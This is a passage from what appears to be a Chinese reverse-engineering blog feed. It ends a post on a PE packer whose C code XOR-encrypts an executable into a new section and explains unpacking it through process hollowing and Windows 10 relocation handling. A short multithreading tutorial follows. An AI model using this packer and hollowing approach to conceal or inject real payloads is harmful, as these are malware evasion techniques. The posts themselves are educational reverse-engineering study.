filentheader-&gt;OptionalHeader.SizeOfImage;<br>    <span class="hljs-keyword">if</span> (tempsection-&gt;Misc.VirtualSize % <span class="hljs-number">0x1000</span>)<br>    &#123;<br>        temptemp = ((tempsection-&gt;Misc.VirtualSize / <span class="hljs-number">0x1000</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">0x1000</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        temptemp = tempsection-&gt;Misc.VirtualSize;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> realsize = tempsection-&gt;SizeOfRawData + tempsection-&gt;PointerToRawData;<br>    shellsection-&gt;Misc.VirtualSize = imgsize;<br>    shellsection-&gt;VirtualAddress = tempsection-&gt;VirtualAddress + temptemp;<br>    shellsection-&gt;SizeOfRawData = imgsize;<br>    shellsection-&gt;PointerToRawData = realsize;<span class="hljs-comment">//这边踩坑了，有些编译器会在最后节后面加东西导致文件不对齐</span><br>    shellsection-&gt;Characteristics = <span class="hljs-number">0xe0500060</span>;<br>    shellntheader-&gt;FileHeader.NumberOfSections += <span class="hljs-number">1</span>;        <span class="hljs-comment">//节数+1  </span><br>    shellntheader-&gt;OptionalHeader.SizeOfImage = shellsection-&gt;VirtualAddress + imgsize;<br>    <span class="hljs-keyword">for</span> (i = temp,j=<span class="hljs-number">0</span>; i &lt; tempsize; i++,j++)<br>    &#123;<br>        *((BYTE*)shellbuffer + <span class="hljs-keyword">sizeof</span>(IMAGE_DOS_HEADER)+j) = *((BYTE*)shellbuffer + i);<br>        *((BYTE*)shellbuffer + i) = <span class="hljs-number">0</span>;<br>    &#125;<br>    fwrite((BYTE*)shellbuffer, realsize, <span class="hljs-number">1</span>, c);<br>    <span class="hljs-comment">//新增节完成</span><br>    <span class="hljs-comment">//加密pe最后填充</span><br>    srand(<span class="hljs-number">233</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key;<br>    LPVOID encryptFileBuffer = <span class="hljs-literal">NULL</span>;<br>    encryptFileBuffer = FileBufferToImageBuffer((BYTE*)filebuffer, imgsize);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; imgsize; i++)<br>    &#123;<br>        key = rand();<br>        *((BYTE*)encryptFileBuffer + i) ^= key;<br>    &#125;<br>    fwrite(encryptFileBuffer, imgsize, <span class="hljs-number">1</span>, c);<br>    <span class="hljs-built_in">free</span>(filebuffer);<br>    <span class="hljs-built_in">free</span>(encryptFileBuffer);<br>    <span class="hljs-built_in">free</span>(shellbuffer);<br>    fclose(c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;done!\n&quot;</span>);<br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">LPVOID <span class="hljs-title">FileBufferToImageBuffer</span><span class="hljs-params">(BYTE* decodebuffer, DWORD&amp; size)</span></span><br><span class="hljs-function"></span>&#123;<br>    PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER pSectionHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER pSectionHeader_LAST = <span class="hljs-literal">NULL</span>;<br><br><br>    pDosHeader = (PIMAGE_DOS_HEADER)decodebuffer;<br>    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)decodebuffer + pDosHeader-&gt;e_lfanew);<br>    pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class="hljs-number">4</span>);<br>    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);<br>    pSectionHeader_LAST = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + (pPEHeader-&gt;NumberOfSections - <span class="hljs-number">1</span>) * <span class="hljs-number">40</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fileLength = pSectionHeader_LAST-&gt;PointerToRawData + pSectionHeader_LAST-&gt;SizeOfRawData;<br>    size = pNTHeader-&gt;OptionalHeader.SizeOfImage;<br>    BYTE* pEncryptBuffer = (BYTE*)<span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-built_in">memset</span>(pEncryptBuffer, <span class="hljs-number">0</span>, size);<br>    <span class="hljs-built_in">memcpy</span>(pEncryptBuffer, decodebuffer, pNTHeader-&gt;OptionalHeader.SizeOfHeaders);<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pNTHeader-&gt;FileHeader.NumberOfSections; i++)<br>    &#123;<br>        <span class="hljs-built_in">memcpy</span>(pEncryptBuffer + pSectionHeader-&gt;VirtualAddress, decodebuffer + pSectionHeader-&gt;PointerToRawData, pSectionHeader-&gt;SizeOfRawData);<br>        pSectionHeader++;<br>    &#125;<br><br><br>    <span class="hljs-keyword">return</span> pEncryptBuffer;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="流程简介"><a href="#流程简介" class="headerlink" title="流程简介"></a>流程简介</h1><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><p>encodeshell主要功能是抹去dos stub，新增节并把目标文件xor伪随机数后按照内存对齐后塞入</p><h2 id="解壳"><a href="#解壳" class="headerlink" title="解壳"></a>解壳</h2><ol><li><p>读取主模块数据</p></li><li><p>解密得到原来pe文件</p></li><li><p>以挂起的形式创建进程 </p></li><li><p>获取context结构体</p></li><li><p>卸载外壳程序</p></li><li><p>在指定位置分配空间</p></li><li><p>修改外壳context结构体只修改imagebase和oep</p></li><li><p>成功</p></li></ol><p>大致流程是这样</p><p>过程很简单，主要说一下问题</p><h1 id="关于Process-Hollowing"><a href="#关于Process-Hollowing" class="headerlink" title="关于Process Hollowing"></a>关于Process Hollowing</h1><p>github地址:<a href="https://github.com/psbazx/PE_shell">https://github.com/psbazx/PE_shell</a></p><p>最近把这个技术完善的同时遇到了许多问题</p><p>在此之前已经完成大部分功能除了一个重定位，如果virtualallocex没有分配内存在指定地址需要我们手动重定位后writeprocessmemory进去<br><img src="image-20200730142534271.png" alt="image-20200730142534271"></p><p>但是出现了一点问题，经过调试重定位完全正确，在调试时write完后attach到进程看指定内存发现是正确的</p><p>但是一旦ResumeThread后就出现问题了，地址重定位有问题，仔细比较插值发现是二次重定位了</p><p>所以这边不需要重定位直接可以跑，但是在印象中操作系统并不会帮我们干这些事情，让我一时有点懵逼</p><p>这边参考腾讯游戏安全实验室文章</p><p><a href="https://www.52pojie.cn/thread-501486-1-1.html">https://www.52pojie.cn/thread-501486-1-1.html</a></p><p><img src="image-20200730143146098.png" alt="image-20200730143146098"></p><p>所以为什么不行了呢？操作系统自动帮你完成了重定位？</p><p>测试下发现winxp必须重定位</p><p>目前猜想是win10内核函数的改变，会比较文件imagebase和加载时imagebase</p><p><img src="image-20200730143423712.png" alt="image-20200730143423712"></p><p>​    WriteProcessMemory(pi.hProcess, (void*)(contx.Ebx + 8), &amp;p, sizeof(DWORD), &amp;old);改变了imagebase</p><p>但还不清楚具体会调用哪些函数。。。</p><p>等有空了再把这个坑填了</p><p><a href="https://www.cnblogs.com/binsys/articles/2711019.html">https://www.cnblogs.com/binsys/articles/2711019.html</a></p><p>当你调用resume thread后，主线程从内核函数KiStartUserThread开始运行，它会调用LdrInitializeThunk做Image loader，做完之后才调用的RtlUserThreadStart</p><p>LdrInitializeThunk如上链接，会把当前peb+8也就是ebx+8处的imagebase传入LdrPEStartup，当前映射的基地址和pe文件的基地址对比是否相等，不相等则调用对应重定位函数LdrPerformRelocations</p><p>查看LdrpInitializeProcess</p><p><img src="image-20200803105942111.png" alt="image-20200803105942111"></p><p>这边会判断是否相等，不想等则重定位</p><p><img src="image-20200803110108339.png" alt="image-20200803110108339"></p><p>这边再来看一波win10的LdrpInitializeProcess</p><p><img src="image-20200803110705943.png" alt="image-20200803110705943"></p><p>判断是否64位，peb64位的imagebase再0x10偏移处v94 = v8+0x10</p><p>v8再一开始初始化时是peb</p><p><img src="image-20200803110803527.png" alt="image-20200803110803527"></p><p>至于32位则需要看syswow64里的ntdll</p><p><img src="image-20200803111713334.png" alt="image-20200803111713334"></p><p>这边就是+8了</p><p>另外，我github上的代码有一些小bug比如中文路径，存在中文路径会内存分配失败</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多线程入门知识</title>
    <link href="/2020/04/11/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86/"/>
    <url>/2020/04/11/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>一些比较基础的知识</p><a id="more"></a><p>先来谈一谈线程安全问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><br><span class="hljs-keyword">int</span> temp = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//pthread_mutex_t mut;</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">counter3</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* args)</span> </span>&#123;<br><span class="hljs-keyword">int</span> i = temp;<br>i++;<br>Sleep(<span class="hljs-number">10</span>);<br>temp = i;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">counter4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* args)</span> </span>&#123;<br><span class="hljs-keyword">int</span> i = temp;<br>i++;<br>Sleep(<span class="hljs-number">10</span>);<br>temp = i;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//pthread_mutex_init(&amp;mut, NULL);</span><br><span class="hljs-keyword">pthread_t</span> t3;<br><span class="hljs-keyword">pthread_t</span> t4;<br>pthread_create(&amp;t3, <span class="hljs-literal">NULL</span>, counter3, <span class="hljs-literal">NULL</span>);<br>pthread_create(&amp;t4, <span class="hljs-literal">NULL</span>, counter4, <span class="hljs-literal">NULL</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, temp);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>示例程序如上</p><p>照理说temp这个全局变量应该是1</p><p>但是运行结果如下</p><p><img src="1.png" alt="1"></p><p>在执行线程1处理函数时，当cpu还没来得及给temp赋值，因为时间片到点cpu进行调度，开始执行线程2处理函数，此时temp还是0，所以最终temp值为1.</p><p>此处加sleep函数是为了让cpu来不及给temp赋值</p><p>由此产生了一个东西叫做临界区。</p><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><br><br>CRITICAL_SECTION aaa;<br><span class="hljs-keyword">int</span> temp=<span class="hljs-number">0</span>;<br><span class="hljs-comment">//pthread_mutex_t mut;</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">counter3</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* args)</span> </span>&#123;<br>EnterCriticalSection(&amp;aaa);<br><span class="hljs-keyword">int</span> i = temp;<br>i++;<br>Sleep(<span class="hljs-number">10</span>);<br>temp = i;<br>LeaveCriticalSection(&amp;aaa);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">counter4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* args)</span> </span>&#123;<br>EnterCriticalSection(&amp;aaa);<br><span class="hljs-keyword">int</span> i = temp;<br>i++;<br>Sleep(<span class="hljs-number">10</span>);<br>temp = i;<br>LeaveCriticalSection(&amp;aaa);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>InitializeCriticalSection(&amp;aaa);<br><span class="hljs-comment">//pthread_mutex_init(&amp;mut, NULL);</span><br><span class="hljs-keyword">pthread_t</span> t3;<br><span class="hljs-keyword">pthread_t</span> t4;<br>pthread_create(&amp;t3, <span class="hljs-literal">NULL</span>, counter3, <span class="hljs-literal">NULL</span>);<br>pthread_create(&amp;t4, <span class="hljs-literal">NULL</span>, counter4, <span class="hljs-literal">NULL</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, temp);<br>getchar();<br>DeleteCriticalSection(&amp;aaa);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到程序输出为2</p><p><img src="2.png" alt="2"></p><p>但如果使用不当会产生死锁程序</p><p>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><br><br>CRITICAL_SECTION aaa;<br>CRITICAL_SECTION bbb;<br><span class="hljs-keyword">int</span> temp=<span class="hljs-number">0</span>;<br><span class="hljs-comment">//pthread_mutex_t mut;</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">counter3</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* args)</span> </span>&#123;<br>EnterCriticalSection(&amp;aaa);<br>Sleep(<span class="hljs-number">10</span>);<br>EnterCriticalSection(&amp;bbb);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;done&quot;</span>);<br><span class="hljs-keyword">int</span> i = temp;<br>i++;<br>temp = i;<br>LeaveCriticalSection(&amp;bbb);<br>LeaveCriticalSection(&amp;aaa);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">counter4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* args)</span> </span>&#123;<br>EnterCriticalSection(&amp;bbb);<br>Sleep(<span class="hljs-number">10</span>);<br>EnterCriticalSection(&amp;aaa);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;done&quot;</span>);<br><span class="hljs-keyword">int</span> i = temp;<br>i++;<br>temp = i;<br>LeaveCriticalSection(&amp;aaa);<br>LeaveCriticalSection(&amp;bbb);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>InitializeCriticalSection(&amp;aaa);<br>InitializeCriticalSection(&amp;bbb);<br><span class="hljs-comment">//pthread_mutex_init(&amp;mut, NULL);</span><br><span class="hljs-keyword">pthread_t</span> t3;<br><span class="hljs-keyword">pthread_t</span> t4;<br>pthread_create(&amp;t3, <span class="hljs-literal">NULL</span>, counter3, <span class="hljs-literal">NULL</span>);<br>pthread_create(&amp;t4, <span class="hljs-literal">NULL</span>, counter4, <span class="hljs-literal">NULL</span>);<br>Sleep(<span class="hljs-number">1000</span>*<span class="hljs-number">60</span>);<br>getchar();<br>DeleteCriticalSection(&amp;aaa);<br>DeleteCriticalSection(&amp;bbb);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>程序始终不会打印出done<br>最简单的处理方法就是获取锁的顺序一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">WaitForSingleObject  (<br>HANDLE hHandle,        <span class="hljs-comment">// handle to object</span><br>  DWORD dwMilliseconds   <span class="hljs-comment">// time-out interval</span><br>);<br></code></pre></td></tr></table></figure><p>个人理解为获取，如何获取分俩种情况一种是内核对象编程已触发，还有一种是时间到点。<br>hHandle为内核句柄(如线程进程)<br>dwMilliseconds为等待时间，单位是毫秒  INFINITE(-1)一直等待<br>返回值：<br>WAIT_OBJECT_0(0)            等待对象变为已通知<br>WAIT_TIMEOUT(0x102)            超时<br>特别说明：<br>1、内核对象中的每种对象都可以说是处于已通知或未通知的状态之中<br>2、这种状态的切换是由Microsoft为每个对象建立的一套规则来决定的<br>3、当线程正在运行的时候，线程内核对象处于未通知状态<br>4、当线程终止运行的时候，它就变为已通知状态<br>5、在内核中就是个BOOL值，运行时FALSE 结束TRUE            </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc1</span><span class="hljs-params">(LPVOID lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+++++++++\n&quot;</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hThread1 = ::CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc1,<br><span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD dwCode = ::WaitForSingleObject(hThread1, <span class="hljs-number">2000</span>);<br>MessageBox(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>DWORD WaitForMultipleObjects(<br>  DWORD nCount,             // number of handles in array<br>  CONST HANDLE *lpHandles,  // object-handle array<br>  BOOL bWaitAll,            // wait option<br>  DWORD dwMilliseconds      // time-out interval<br>);        </p><p>nCount为线程数目<br>lpHandles为线程句柄的数组<br>bWaitAll表示是否等待，false时只要一个线程执行完毕即结束，true时要等俩个线程都结束<br>dwMilliseconds表示等待时间，和WaitForSingleObject一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc1</span><span class="hljs-params">(LPVOID lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+++++++++\n&quot;</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc2</span><span class="hljs-params">(LPVOID lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------\n&quot;</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hArray[<span class="hljs-number">2</span>];<br><span class="hljs-comment">//创建一个新的线程</span><br>HANDLE hThread1 = ::CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc1,<br><span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//创建一个新的线程</span><br>HANDLE hThread2 = ::CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc2,<br><span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>hArray[<span class="hljs-number">0</span>] = hThread1;<br>hArray[<span class="hljs-number">1</span>] = hThread2;<br>DWORD dwCode = ::WaitForMultipleObjects(<span class="hljs-number">2</span>, hArray, TRUE, INFINITE);<br>MessageBox(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="互斥量"><a href="#互斥量" class="headerlink" title="互斥量"></a>互斥量</h2><p>互斥量也是一个内核对象</p><p>HANDLE CreateMutex(<br>  LPSECURITY_ATTRIBUTESlpMutexAttributes,<br> 